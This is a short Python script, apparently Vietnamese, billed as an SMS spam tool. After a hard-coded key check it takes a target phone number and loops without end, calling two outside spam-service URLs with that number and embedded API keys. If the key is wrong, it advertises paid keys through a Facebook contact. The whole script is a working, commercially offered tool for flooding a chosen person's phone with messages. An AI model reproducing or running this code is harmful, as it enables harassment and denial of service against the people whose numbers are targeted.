import requests,time,os,sys
print("Tool Spam SMS by Tô Thế Thanh")
key = input("nhập key:")
if key == "cocainit":
  os.system("clear")
  sdt=input("nhập sđt cần spam:")
  s=float(input("nhập delay:"))
  while True:
    x = requests.get(f"https://nnquangpro.com/Sms/Spam.php?key=tthanh1402&phone={sdt}")
    y = requests.get(f'https://minhnghia.me/VMN/SPAMSMS.php?phone={sdt}&key=thethanh-11')
    print("\033[1;32m Spam Thành Công")
    time.sleep(s)
else:
  print("Key Sai Mua Key 500/1day ib fb:https://www.facebook.com/thethanh1402?mibextid=ZbWKwL")
  
  
